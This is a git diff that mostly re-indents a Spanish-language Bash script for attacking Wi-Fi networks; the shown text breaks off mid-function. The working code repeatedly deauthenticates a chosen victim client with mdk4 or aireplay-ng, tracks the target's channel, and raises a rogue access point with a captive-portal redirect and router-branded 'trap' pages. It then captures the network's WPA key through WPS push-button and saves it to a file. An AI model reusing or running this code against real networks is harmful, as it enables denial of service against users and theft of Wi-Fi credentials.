@@ -42,79 +42,79 @@ canal_nuevo=2
 pwd_local=$(pwd)
 
 function salida() {
-if [ "$salir" == "1" ];then
-    exit 1
-fi
-/etc/init.d/dnsmasq start &>/dev/null
-/etc/init.d/wpa_supplicant start &>/dev/null
-if [ $airodump = 1 ] 2>/dev/null ;then
-    killall airodumop-ng &>/dev/null
-fi
-echo;echo -e "${AMARILLO}[::]${BLANCO} Limpieza!"
-tput cnorm 2>/dev/null
-echo;echo -e "${VERDE}[::]${BLANCO} Quitando modo monitor si esta puesto...!"
-monitor quitar &>/dev/null
-echo -e "${VERDE}[::]${BLANCO} Reiniciando NetworkManager..."
-systemctl restart NetworkManager >/dev/null 2>&1
-systemctl restart wpa_supplicant >/dev/null 2>&1
-systemctl restart NetworkManager.service >/dev/null 2>&1
-service wpa_supplicant restart >/dev/null 2>&1
-/etc/rc.d/rc.networkmanager restart >/dev/null 2>&1
-for proceso in lighttpd opennds dnsmasq hostapd wpa_supplicant ;do
-    for i in `ps $bandera | grep $proceso | grep -v grep | awk -F ' ' '{print $1}'`;do
-        echo -e "${VERDE}[::]${BLANCO} Matando PID $i de $proceso."
-        kill -9 $i 
+    if [ "$salir" == "1" ];then
+        exit 1
+    fi
+    /etc/init.d/dnsmasq start &>/dev/null
+    /etc/init.d/wpa_supplicant start &>/dev/null
+    if [ $airodump = 1 ] 2>/dev/null ;then
+        killall airodumop-ng &>/dev/null
+    fi
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Limpieza!"
+    tput cnorm 2>/dev/null
+    echo;echo -e "${VERDE}[::]${BLANCO} Quitando modo monitor si esta puesto...!"
+    monitor quitar &>/dev/null
+    echo -e "${VERDE}[::]${BLANCO} Reiniciando NetworkManager..."
+    systemctl restart NetworkManager >/dev/null 2>&1
+    systemctl restart wpa_supplicant >/dev/null 2>&1
+    systemctl restart NetworkManager.service >/dev/null 2>&1
+    service wpa_supplicant restart >/dev/null 2>&1
+    /etc/rc.d/rc.networkmanager restart >/dev/null 2>&1
+    for proceso in lighttpd opennds dnsmasq hostapd wpa_supplicant ;do
+        for i in `ps $bandera | grep $proceso | grep -v grep | awk -F ' ' '{print $1}'`;do
+            echo -e "${VERDE}[::]${BLANCO} Matando PID $i de $proceso."
+            kill -9 $i 
+        done
+            echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la próxima!."; echo
+            echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que, si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
+            break
     done
-        echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la próxima!."; echo
-        echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que, si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
-        break
-done
-kill -9 $$ >/dev/null 1>&2 && exit 
+    kill -9 $$ >/dev/null 1>&2 && exit 
 }
 
 function eleccion_dispositivo() {
-echo;echo " Lista de dispositivos disponibles:";echo
-rm ${pwd}lista_interfaces 2>/dev/null
-iw dev | grep -oP 'Interface \K\S+' >${pwd}lista_interfaces 
-cuenta=1
-for i in `cat ${pwd}lista_interfaces`; do
-rm ${pwd}$i 2>/dev/null
-touch ${pwd}$i 
-driver=$(ethtool -i $i | grep driver | cut -d ':' -f2)
-echo "driver: $(ethtool -i $i | grep driver | cut -d ':' -f2)" >> ${pwd}$i
-phy=$(cat /sys/class/net/${i}/phy80211/name)
-echo "phy: $(cat /sys/class/net/${i}/phy80211/name)" >> ${pwd}$i
-iw phy $phy info | awk '/^[[:blank:]]*\* monitor/' &>/dev/null
-if [ $? -eq 0 ];then
-        monitor=${VERDE}si${NORMAL}
-else
-        monitor=${ROJO}no${NORMAL}
-fi
-iw phy $phy info | awk '/^[[:blank:]]*\* AP$/' | grep AP &>/dev/null
-if [ $? -eq 0 ];then
-        AP=${VERDE}si${NORMAL}
-else
-        AP=${ROJO}no${NORMAL}
-fi
-iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 2412 &>/dev/null
-if [ $? -eq 0 ];then
-        b24=${VERDE}si${NORMAL}
-        echo "banda:24">>${pwd}$i
-else
-        b24=${ROJO}no${NORMAL}
-fi
-iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 5180 &>/dev/null
-if [ $? -eq 0 ];then
-        b5=${VERDE}si${NORMAL}
-        echo "banda:5">>${pwd}$i
-else
-        b5=${ROJO}no${NORMAL}
-fi
-echo "  $i (${phy}) ${VIOLETA}|${NORMAL} 2,4GHz: $b24 ${VIOLETA}|${NORMAL} 5GHz: $b5 ${VIOLETA}|${NORMAL} modo monitor: $monitor ${VIOLETA}|${NORMAL} Modo AP: $AP ${VIOLETA}|${NORMAL} driver:${VERDE}${driver}${NORMAL}"
-unset driver phy 24 5 monitor AP
-((cuenta++))
-done
-echo
+    echo;echo " Lista de dispositivos disponibles:";echo
+    rm ${pwd}lista_interfaces 2>/dev/null
+    iw dev | grep -oP 'Interface \K\S+' >${pwd}lista_interfaces 
+    cuenta=1
+    for i in `cat ${pwd}lista_interfaces`; do
+    rm ${pwd}$i 2>/dev/null
+    touch ${pwd}$i 
+    driver=$(ethtool -i $i | grep driver | cut -d ':' -f2)
+    echo "driver: $(ethtool -i $i | grep driver | cut -d ':' -f2)" >> ${pwd}$i
+    phy=$(cat /sys/class/net/${i}/phy80211/name)
+    echo "phy: $(cat /sys/class/net/${i}/phy80211/name)" >> ${pwd}$i
+    iw phy $phy info | awk '/^[[:blank:]]*\* monitor/' &>/dev/null
+    if [ $? -eq 0 ];then
+            monitor=${VERDE}si${NORMAL}
+    else
+            monitor=${ROJO}no${NORMAL}
+    fi
+    iw phy $phy info | awk '/^[[:blank:]]*\* AP$/' | grep AP &>/dev/null
+    if [ $? -eq 0 ];then
+            AP=${VERDE}si${NORMAL}
+    else
+            AP=${ROJO}no${NORMAL}
+    fi
+    iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 2412 &>/dev/null
+    if [ $? -eq 0 ];then
+            b24=${VERDE}si${NORMAL}
+            echo "banda:24">>${pwd}$i
+    else
+            b24=${ROJO}no${NORMAL}
+    fi
+    iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 5180 &>/dev/null
+    if [ $? -eq 0 ];then
+            b5=${VERDE}si${NORMAL}
+            echo "banda:5">>${pwd}$i
+    else
+            b5=${ROJO}no${NORMAL}
+    fi
+    echo "  $i (${phy}) ${VIOLETA}|${NORMAL} 2,4GHz: $b24 ${VIOLETA}|${NORMAL} 5GHz: $b5 ${VIOLETA}|${NORMAL} modo monitor: $monitor ${VIOLETA}|${NORMAL} Modo AP: $AP ${VIOLETA}|${NORMAL} driver:${VERDE}${driver}${NORMAL}"
+    unset driver phy 24 5 monitor AP
+    ((cuenta++))
+    done
+    echo
 }
 
 function abierto() {
@@ -261,10 +261,10 @@ pid_lighttpd=$!
 }
 
 function fiptables() {
-iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.12.1:80
-iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
-iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
-iptables -A INPUT -p udp --destination-port 53 -j ACCEPT
+    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.12.1:80
+    iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
+    iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
+    iptables -A INPUT -p udp --destination-port 53 -j ACCEPT
 }
 
 function generar_index() {
@@ -558,18 +558,18 @@ fi
 }
 
 function berate_confirmado() {
-echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de acceso... Si no pasas de esta pantalla, revisa que tu dispositivo soporte el modo AP.${BLANCO}"
-while :
-do
-    grep ENABLE ${pwd}hostapd &>/dev/null
-    if [ $? = 0 ];then
-        echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso con nombre ${AMARILLO} $nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
-        sleep 1
-        break
-    else
-        sleep 5
-    fi
-done
+    echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de acceso... Si no pasas de esta pantalla, revisa que tu dispositivo soporte el modo AP.${BLANCO}"
+    while :
+    do
+        grep ENABLE ${pwd}hostapd &>/dev/null
+        if [ $? = 0 ];then
+            echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso con nombre ${AMARILLO} $nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
+            sleep 1
+            break
+        else
+            sleep 5
+        fi
+    done
 }
 
 echo "Vaya dedos tienes. Pon más atención.
@@ -588,536 +588,536 @@ Tas pendejo?
 Bro, me estas vacilando, no?" >${pwd}torpe
 
 function validar_numero() {
-if [[ $1 -eq "0" ]] 2>/dev/null;then
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
-    read
-    $2
-fi
-numero='^[0-9]+$'
-while :
-do
-    if [[ $1 =~ $numero ]];then
-        break
-    else
+    if [[ $1 -eq "0" ]] 2>/dev/null;then
         echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
         read
         $2
-        break
     fi
-done
+    numero='^[0-9]+$'
+    while :
+    do
+        if [[ $1 =~ $numero ]];then
+            break
+        else
+            echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
+            read
+            $2
+            break
+        fi
+    done
 }
 
 function comprobar_wpa() {
-while :
-do
-    sleep 10
-    ps $bandera | grep -i "wpa_supplicant -c ${pwd}pbc.conf" | grep -v grep &>/dev/null
-    if [ $? -ne 0 ];then
-        escuchar_wps
-    fi
-    if ( grep -q "network=" ${pwd}pbc.conf ) ;then
-        grep "00000000" ${pwd}pbc.conf
+    while :
+    do
+        sleep 10
+        ps $bandera | grep -i "wpa_supplicant -c ${pwd}pbc.conf" | grep -v grep &>/dev/null
         if [ $? -ne 0 ];then
-            cp ${pwd}pbc.conf  ${red}_WPA.txt
-            echo;echo -e "${VERDE}		Ole !!! hemos conseguido la llave!${BLANCO}"
-            wpa=`cat ${pwd}pbc.conf | grep psk= | cut -d '"' -f 2`
-            ssid=`cat ${pwd}pbc.conf | grep ssid= | cut -d '"' -f 2`
-            echo;echo -e "  ${AMARILLO} red ${VERDE} $ssid ${AMARILLO} WPA ${VERDE} $wpa ";echo
-            echo -e "${AMARILLO}[::]${BLANCO}	Se ha creado un archivo con la WPA en el directorio de trabajo."
-            echo -e "${AMARILLO}[::]${BLANCO}	Un placer y hasta la proxima!!!...ByTux0..."
-            kill -9 $pid_comprobar_wpa &>/dev/null
-            kill -9 $crono_pid &>/dev/null
-            break
+            escuchar_wps
         fi
-    fi
-done
-kill $pids >/dev/null 2>&1
-salida
+        if ( grep -q "network=" ${pwd}pbc.conf ) ;then
+            grep "00000000" ${pwd}pbc.conf
+            if [ $? -ne 0 ];then
+                cp ${pwd}pbc.conf  ${red}_WPA.txt
+                echo;echo -e "${VERDE}		Ole !!! hemos conseguido la llave!${BLANCO}"
+                wpa=`cat ${pwd}pbc.conf | grep psk= | cut -d '"' -f 2`
+                ssid=`cat ${pwd}pbc.conf | grep ssid= | cut -d '"' -f 2`
+                echo;echo -e "  ${AMARILLO} red ${VERDE} $ssid ${AMARILLO} WPA ${VERDE} $wpa ";echo
+                echo -e "${AMARILLO}[::]${BLANCO}	Se ha creado un archivo con la WPA en el directorio de trabajo."
+                echo -e "${AMARILLO}[::]${BLANCO}	Un placer y hasta la proxima!!!...ByTux0..."
+                kill -9 $pid_comprobar_wpa &>/dev/null
+                kill -9 $crono_pid &>/dev/null
+                break
+            fi
+        fi
+    done
+    kill $pids >/dev/null 2>&1
+    salida
 }
 
 function archivo_pbc() {
-kill $pid_comprobar_wpa &>/dev/null
-kill $wpa_supplicant_pid &>/dev/null
-ls ${pwd}pbc.conf &>/dev/null
-if [ $? -ne 0 ];then
-    rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
-    echo "ctrl_interface=/var/run/wpa_supplicant
-ctrl_interface_group=root
-update_config=1"  >> ${pwd}pbc.conf
-fi
-comprobar_wpa
-pid_comprobar_wpa=$!
+    kill $pid_comprobar_wpa &>/dev/null
+    kill $wpa_supplicant_pid &>/dev/null
+    ls ${pwd}pbc.conf &>/dev/null
+    if [ $? -ne 0 ];then
+        rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
+        echo "ctrl_interface=/var/run/wpa_supplicant
+    ctrl_interface_group=root
+    update_config=1"  >> ${pwd}pbc.conf
+    fi
+    comprobar_wpa
+    pid_comprobar_wpa=$!
 }
 
 function escuchar_wps() {
-ls ${pwd}pbc.conf &>/dev/null
-if [ $? -ne 0 ];then
-    archivo_pbc
-fi
-rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
-pkill wpa_supplicant &>/dev/null
-wpa_supplicant -c ${pwd}pbc.conf -i "$iface_dos" -B &>${pwd}wpa_supplicant
-wpa_supplicant_pid=$!
-if [ $? != 0 ]; then
-    sleep 3
-    monitor limpiar &>/dev/null
-    escuchar_wps
-fi
-kill $pid_comprobar_wpa &>/dev/null
-comprobar_wpa &
-crono
-crono_pid=$!
+    ls ${pwd}pbc.conf &>/dev/null
+    if [ $? -ne 0 ];then
+        archivo_pbc
+    fi
+    rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
+    pkill wpa_supplicant &>/dev/null
+    wpa_supplicant -c ${pwd}pbc.conf -i "$iface_dos" -B &>${pwd}wpa_supplicant
+    wpa_supplicant_pid=$!
+    if [ $? != 0 ]; then
+        sleep 3
+        monitor limpiar &>/dev/null
+        escuchar_wps
+    fi
+    kill $pid_comprobar_wpa &>/dev/null
+    comprobar_wpa &
+    crono
+    crono_pid=$!
 }
 
 function crono() {
-krono=30
-while [ $krono -gt 0 ]; 
-do
-    krono=$((krono - 1))
-    sleep 1
-done
-sleep 2
-echo -e "${VIOLETA}[WPS]${BLANCO}	Reiniciamos escucha WPS"
-kill $pid_wpacli &>/dev/null
-sleep 3
-wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli &
-pid_wpacli=$!
-crono
-crono_pid=$!
+    krono=30
+    while [ $krono -gt 0 ]; 
+    do
+        krono=$((krono - 1))
+        sleep 1
+    done
+    sleep 2
+    echo -e "${VIOLETA}[WPS]${BLANCO}	Reiniciamos escucha WPS"
+    kill $pid_wpacli &>/dev/null
+    sleep 3
+    wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli &
+    pid_wpacli=$!
+    crono
+    crono_pid=$!
 }
 
 function pbc_bucle() {
-echo -e "${VERDE}[WPS]${BLANCO}	Comenzamos a escuchar WPS"
-sleep 2 
-monitor quitar &>/dev/null
-escuchar_wps
-sleep 3
-comprobar_wpa
-pid_comprobar_wpa=$!
+    echo -e "${VERDE}[WPS]${BLANCO}	Comenzamos a escuchar WPS"
+    sleep 2 
+    monitor quitar &>/dev/null
+    escuchar_wps
+    sleep 3
+    comprobar_wpa
+    pid_comprobar_wpa=$!
 }
 
 function comprobar() {
-clear
-banner
-if [ $tipo -eq 1 ];then
-    seguridad=protegido
-elif [ $tipo -eq 2 ];then
-    seguridad=abierto
-fi
-echo;echo -e "${AMARILLO}  Vamos a comprobar todos los datos antes de empezar el ataque${BLANCO}."
-red=`cat ${pwd}elegida | cut -d ',' -f14`
-if [ $banda5 = "si" ];then
-    banda=5GHz
-else
-    banda=2,4GHz
-fi
-echo;echo -e "${AMARILLO}[::]${BLANCO} Banda de ataque: ${VERDE} $banda"
-echo -e "${AMARILLO}[::]${BLANCO} Red a atacar: ${VERDE} $red"
-echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para el ataque DoS: ${VERDE} $iface_dos"
-ls ${pwd}Openwrt &>/dev/null
-if [ $? -ne 0 ];then
-echo -e "${AMARILLO}[::]${BLANCO} Tipo de ataque DoS: ${VERDE} $ataque_dos"
-fi
-echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para crear el punto de acceso: ${VERDE} $iface_ap"
-echo -e "${AMARILLO}[::]${BLANCO} Cliente a atacar: ${VERDE} $mac_estacion"
-echo -e "${AMARILLO}[::]${BLANCO} Nombre de nuestra red ${VERDE} $nombre_ap"
-echo -e "${AMARILLO}[::]${BLANCO} Tipo de red ${VERDE} $seguridad"
-echo -e "${AMARILLO}[::]${BLANCO} Marca router a atacar: ${VERDE} $modelo"
-echo;echo -e "${AMARILLO}[::]${BLANCO} Opciones: "
-echo;echo -e "   ${AMARILLO}1)${BLANCO}	Que se tense!! "
-echo -e "   ${AMARILLO}2)${BLANCO}	Quiero volver a configurarlo todo. "
-echo -e "   ${AMARILLO}3)${BLANCO}	Quiero volver a configurar los datos del punto de acceso. "
-echo -e "   ${AMARILLO}4)${BLANCO}	Quiero volver a elegir red de las que ya hemos escaneado. "
-echo -e "   ${AMARILLO}5)${BLANCO}	Quiero volver a escanear. "
-echo;echo -ne "${AMARILLO}[??]${BLANCO}	Opción: "
-read opcion
-if [ -z $opcion ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
-        read
-        comprobar 
-fi
-validar_numero $opcion comprobar 
-if [ $opcion -eq 1  ];then
-    abierto
-elif [ $opcion -eq 2 ];then
-    empezar
-elif [ $opcion -eq 3 ];then
-    config_ap
-elif [ $opcion -eq 4 ];then
-    parseo
-elif [ $opcion -eq 5 ];then
-    airodump
-else
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
-    read
-    comprobar
-fi
-}
-
-function dos() {
-clear
-banner
-rm ${pwd}parar &>/dev/null
-echo;echo -e "${AMARILLO}   COMIENZA EL ATAQUE! No se abrirán ventanas adicionales. Para depurar, mirar en la carpeta ${pwd}${BLANCO}";echo
-echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso ${AMARILLO}$nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
-echo -e "${VERDE}[DoS]${BLANCO}	Inicia ataque DoS..."
-while :
-do
-    ls ${pwd}parar &>/dev/null
-    if [ $? = 0 ];then
-        break
-    fi
-    timeout=10
-    canal_nuevo
-    canal=$canal_nuevo
-    echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente esta en el canal${CYAN} ${canal}${BLANCO}. Seguimos el ataque..."
-    echo -e "${AMARILLO}[DoS]${BLANCO}	Reiniciando DoS..."
-    ip a | grep $iface_dos &>/dev/null
-    if [ $? = 0 ];then
-        iw dev $iface_dos set channel $canal &>/dev/null
-        else
-            monitor poner  &>/dev/null
-    fi
-    if [ "$mdk4" = "si" ];then
-        timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon d -c $canal -B $macap -S $mac_estacion &>>${pwd}mdk4
-    else
-        aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
-    fi
-    pid_aireplay=$!
-done
-echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
-}
-
-function canal_nuevo {
-rm ${pwd}airodump_canal* 2>/dev/null
-if [ $banda5 = si ];then
-    timeout --preserve-status --foreground $timeout airodump-ng --band a --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodump5&>/dev/null
-else
-    timeout --preserve-status --foreground $timeout airodump-ng --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodum24&>/dev/null
-fi
-canal_nuevo=`cat ${pwd}airodump_canal-01.csv | grep $macap | grep WPA | awk -F "," '{print $4}'` &>/dev/null
-if [ $banda5 = si ];then
-    if (( canal_nuevo >=36 && canal_nuevo <= 165 ));then
-        echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
-    else
-        echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
-        timeout=$((timeout+2))
-        canal_nuevo
-    fi
-else
-    if (( canal_nuevo >=1 && canal_nuevo <= 14 ));then
-        echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
-    else
-        echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
-        timeout=$((timeout+2))
-        canal_nuevo
-    fi
-fi
-canal=$canal_nuevo
-echo $canal ${pwd}canal &>/dev/null
-}
-
-function config_ap() {
-clear
-banner
-echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora toca configurar nuestro punto de acceso${BLANCO}."
-echo -e "${AMARILLO}[::]${BLANCO} Levantaremos un punto de acceso protegido (solo para clientes con windows) o abierto? ${BLANCO}";echo
-echo -e "  ${AMARILLO}1)${BLANCO}  Protegido"
-echo -e "  ${AMARILLO}2)${BLANCO}  Abierto"
-echo;echo -ne "${AMARILLO}[??]${BLANCO} Opción: "
-read tipo
-if [ -z $tipo ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
-        read
-        config_ap
-fi
-validar_numero $tipo config_ap
-if [ $tipo -ne 1 ] && [ $tipo -ne 2 ];then
-    echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa ENTER para intentarlo otra vez"
-    read
-    config_ap
-fi
-echo;echo -ne "${AMARILLO}[::]${BLANCO} Nombre el punto de acceso que vamos a crear. (Necesario): "
-read nombre_ap
-if [ -z $nombre_ap ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
-        read
-        config_ap 
-fi
-echo $nombre_ap >${pwd}nombre_ap &>/dev/null
-if [ -z "$marca" ];then
-    marca=desconocido
-fi
-clear
-banner
-echo;echo -e "${AMARILLO}[::]${BLANCO} Info recopilada de la victima:"
-echo;echo -e "${AZUL} Info OUI (marca): ${BLANCO}$marca"
-echo -e "${AZUL} BSSID:${BLANCO} $maoui"
-echo -e "${AZUL} ESSID:${BLANCO}$red"
-echo;echo -e "${AMARILLO}[::]${BLANCO} Elige la mejor opción para la trampa. Si no sabes qué es esto, elige genérico: "
-echo
-rm ${pwd}modelos 2>/dev/null
-touch ${pwd}modelos
-cuenta=1
-for i in `ls imagenes`;do
-    echo -e "  ${AMARILLO}${cuenta})${BLANCO}  $i"
-    echo " $cuenta $i" >>${pwd}modelos
-    essids=`cat imagenes/${i}/targets | awk -F ';' '{print $3}'`
-    bssids=`cat imagenes/${i}/targets | awk -F ';' '{print $2}'`
-    mamo=`cat imagenes/${i}/targets | awk -F ';' '{print $1}'`
-    echo -e "       ${VIOLETA} Targets: ${AZUL}Marca y modelo: ${BLANCO}$mamo ${AZUL} BSSIDS:${BLANCO} $bssids${AZUL} ESSIDS:${BLANCO} $essids"
-    echo 
-    cuenta=$((cuenta+1))
-    done
-echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
-read puesto
-if [ -n "$puesto" ];then
-    validar_numero $puesto config_ap
-else
-    echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opción valida. Pulsa ENTER para intentarlo otra vez"        
-        read
-        config_ap
-fi
-grep -q $puesto ${pwd}modelos
-if [ $? -ne 0 ];then
-echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opción valida. Pulsa ENTER para intentarlo otra vez"        
-        read
-        config_ap
-fi
-modelo=`cat ${pwd}modelos | grep $puesto | awk '{print $2}'`
-comprobar
-}
-
-function clientes() {
-clear
-banner
-sed -n ${1}p ${pwd}airodump >${pwd}elegida
-macap=`cat ${pwd}elegida | cut -d ',' -f1`
-maoui=`echo $macap | awk -F ":" '{print $1 $2 $3}'`
-echo $cana1 >${pwd}canal &>/dev/null
-rm ${pwd}macap 2>/dev/null
-rm ${pwd}cliente* 2>/dev/null
-echo "$macap" >${pwd}macap
-marca=`grep $maoui oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
-if [ -z $marca ];then
-    marca=desconocido
-fi
-red=`cat ${pwd}elegida | cut -d ',' -f14`
-echo;echo -e "${AMARILLO} TU ELECCION:"
-echo;echo -e "${AMARILLO} Punto de acceso ${BLANCO}$red  ${AMARILLO}MAC ${BLANCO}$MAC $macap	${AMARILLO}Info OUI (marca)${BLANCO} $marca"
-echo;echo -e "${AMARILLO} CLIENTES CONECTADOS:${BLANCO}";echo
-cuenta=1
-for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
-do
-    echo $i >${pwd}cliente${cuenta}
-    maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
-    marca_cliente=$`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
-    echo -e "	${CYAN}MAC ${BLANCO} $i ${CYAN}Info OUI (marca) ${BLANCO} $marca_cliente"
-    cuenta=$((cuenta+1))
-done
-echo;echo -e "${AMARILLO}[::]${BLANCO} Elige una de las siguientes opciones:" ;echo
-echo -e "		${AMARILLO}1)${BLANCO} Quiero elegir un cliente y continuar el ataque."
-echo -e "		${AMARILLO}2)${BLANCO} Quiero elegir otra red de las que hemos escaneado ya."
-echo -e "		${AMARILLO}3)${BLANCO} Quiero volver a escanear."
-echo;echo -ne "${AMARILLO}[::]${BLANCO} Opción: "
-read respuesta
-if [ -z $respuesta ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para intentarlo de nuevo, y pon mas atención: "
-        read
-        parseo
-fi
-validar_numero $respuesta parseo
-if [ $respuesta = 1 ];then
     clear
     banner
-    echo;echo -e "${AMARILLO}[::]${BLANCO} Ok!. Escoge un numero de cliente ";echo
-    cuenta=1
-    for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
-    do
-        maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
-        marca_cliente=`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
-        echo -e "${AMARILLO} ${cuenta}) ${CYAN}MAC ${BLANCO} $i ${CYAN}Info OUI (marca) ${BLANCO} $marca_cliente"
-        cuenta=$((cuenta+1))
-    done
-    echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
+    if [ $tipo -eq 1 ];then
+        seguridad=protegido
+    elif [ $tipo -eq 2 ];then
+        seguridad=abierto
+    fi
+    echo;echo -e "${AMARILLO}  Vamos a comprobar todos los datos antes de empezar el ataque${BLANCO}."
+    red=`cat ${pwd}elegida | cut -d ',' -f14`
+    if [ $banda5 = "si" ];then
+        banda=5GHz
+    else
+        banda=2,4GHz
+    fi
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Banda de ataque: ${VERDE} $banda"
+    echo -e "${AMARILLO}[::]${BLANCO} Red a atacar: ${VERDE} $red"
+    echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para el ataque DoS: ${VERDE} $iface_dos"
+    ls ${pwd}Openwrt &>/dev/null
+    if [ $? -ne 0 ];then
+    echo -e "${AMARILLO}[::]${BLANCO} Tipo de ataque DoS: ${VERDE} $ataque_dos"
+    fi
+    echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para crear el punto de acceso: ${VERDE} $iface_ap"
+    echo -e "${AMARILLO}[::]${BLANCO} Cliente a atacar: ${VERDE} $mac_estacion"
+    echo -e "${AMARILLO}[::]${BLANCO} Nombre de nuestra red ${VERDE} $nombre_ap"
+    echo -e "${AMARILLO}[::]${BLANCO} Tipo de red ${VERDE} $seguridad"
+    echo -e "${AMARILLO}[::]${BLANCO} Marca router a atacar: ${VERDE} $modelo"
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Opciones: "
+    echo;echo -e "   ${AMARILLO}1)${BLANCO}	Que se tense!! "
+    echo -e "   ${AMARILLO}2)${BLANCO}	Quiero volver a configurarlo todo. "
+    echo -e "   ${AMARILLO}3)${BLANCO}	Quiero volver a configurar los datos del punto de acceso. "
+    echo -e "   ${AMARILLO}4)${BLANCO}	Quiero volver a elegir red de las que ya hemos escaneado. "
+    echo -e "   ${AMARILLO}5)${BLANCO}	Quiero volver a escanear. "
+    echo;echo -ne "${AMARILLO}[??]${BLANCO}	Opción: "
     read opcion
     if [ -z $opcion ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
-        read
-        parseo
+            echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
+            read
+            comprobar 
     fi
-    validar_numero $opcion parseo
-    cuenta=$((cuenta-1))
-    if [ $opcion -le $cuenta ]; then
-        mac_estacion=`cat ${pwd}cliente${opcion}`
-        elegir_dos
+    validar_numero $opcion comprobar 
+    if [ $opcion -eq 1  ];then
+        abierto
+    elif [ $opcion -eq 2 ];then
+        empezar
+    elif [ $opcion -eq 3 ];then
+        config_ap
+    elif [ $opcion -eq 4 ];then
+        parseo
+    elif [ $opcion -eq 5 ];then
+        airodump
     else
         echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
         read
-        parseo
+        comprobar
     fi
-elif [ $respuesta = 2 ];then
-    parseo
-elif [ $respuesta = 3 ];then
-    airodump
-else
